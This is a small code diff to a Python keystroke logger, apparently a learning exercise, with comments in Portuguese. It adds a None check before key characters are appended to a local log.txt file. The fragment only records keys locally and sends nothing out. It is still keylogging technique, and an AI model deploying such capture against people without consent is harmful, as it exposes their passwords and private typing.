@@ -12,8 +12,9 @@ IGNORAR = {keyboard.Key.shift,
 def on_press(key):
     try:
         # se for uma tecla "normal" (letra, número, símbolo)
-        with open("log.txt", "a", encoding="utf-8") as f:
-            f.write(key.char)
+        if key.char is not None:
+            with open("log.txt", "a", encoding="utf-8") as f:
+                f.write(key.char)
     except AttributeError:
         with open("log.txt", "a", encoding="utf-8") as f:
             if key == keyboard.Key.space:
